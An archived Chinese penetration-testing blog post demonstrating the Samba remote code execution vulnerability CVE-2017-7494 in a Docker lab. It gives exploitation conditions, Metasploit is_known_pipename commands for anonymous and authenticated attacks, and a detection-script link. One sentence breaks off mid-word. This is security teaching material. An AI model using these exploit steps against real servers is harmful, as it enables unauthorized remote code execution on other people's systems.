# 服务器版“永恒之蓝”高危预警 （Samba 远程命令执行漏洞 CVE-2017-7494） 攻击演示 - 渗透测试中心 - 博客园

> 原文：[`www.cnblogs.com/backlion/p/6905127.html`](https://www.cnblogs.com/backlion/p/6905127.html)

## 漏洞信息:

2017 年 5 月 24 日 Samba 发布了 4.6.4 版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号 CVE-2017-7494，漏洞影响了 Samba 3.5.0 之后到 4.6.4/4.5.10/4.4.14 中间的所有版本。

## 漏洞利用条件:

1\. 服务器打开了文件/打印机共享端口 445，让其能够在公网上访问

2\. 共享文件拥有写入权限

3\. 恶意攻击者需猜解 Samba 服务端共享目录的物理路径

满足以上条件时，由于 Samba 能够为选定的目录创建网络共享，当恶意的客户端连接上一个可写的共享目录时，通过上传恶意的链接库文件，使服务端程序加载并执行它，从而实现远程代码执行。根据服务器的情况，攻击者还有可能以 root 身份执

## 测试环境：

在 docker 下搭建测试环境

1.拉取镜像到本地

```
root@backlion-virtual-machine:/home/backlion# docker pull medicean/vulapps:s_samba_1
```

2.启动环境，并将虚拟的 445 端口映射到物理机的 445 端口上：

```
root@backlion-virtual-machine:/home/backlion# docker run -d -p 445:445 -p 139:139 -p 138:138 -p 137:137 medicean/vulapps:s_samba_1
```

3.在 msf 下的利用（kali 主机 IP: 10.0.0.140，靶机下的 ubuntu 的物理住机 IP:10.0.0.158)

利用的 poc:

https://github.com/hdm/metasploit-framework/blob/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb

将 is_known_pipename.rb

拷贝到/usr/share/metasploit-framework/modules/exploits/linux/samba/

匿名下的 samba 远程执行之 MSF:

```
root@backlion:~# service postgresql start

root@backlion:~# msfconsole

msf > search is_known_pipename

msf > use exploit/linux/samba/is_known_pipename

msf exploit(is_known_pipename) > show options

msf exploit(is_known_pipename) > set rhost  10.0.0.158 msf exploit(is_known_pipename) > set rport  445 msf exploit(is_known_pipename) > exploit
```

 ![](img/9f4c3b45973dcffcd2eb04b274a5586d.png)

![](img/14429131dd6f6b0776f15d86a99c0099.png)

认证的 samb 下 MSF:

```
msf exploit(is_known_pipename) > set SMBUSER  test

msf exploit(is_known_pipename) > set SMBPASS 123456 msf exploit(is_known_pipename) > set rhost 10.0.0.158 msf exploit(is_known_pipename) > set rport 445 msf exploit(is_known_pipename) > exploit
```

漏洞检查的 NAMP 脚本：

http://ys-k.ys168.com/576161633/UIwHtkm3L3K3I865MJ6/samb.nse

参考文献：

https://mp.weixin.qq.com/s/qWFe3yBg6NUU_kyVRiAzeA
https://mp.weixin.qq.com/s/PPcIhfkrJGoOEf7-Skvr-A

https://mobile.qzone.qq.com/details?sharetag=2866CD731987ABFF941F7FA2F69E8975&bp7=&bp2=&bp1=&_wv=1&res_uin=49870569&appid=2&cellid=1496512730&no_topbar=1&subid=&g_ut=3&from=mp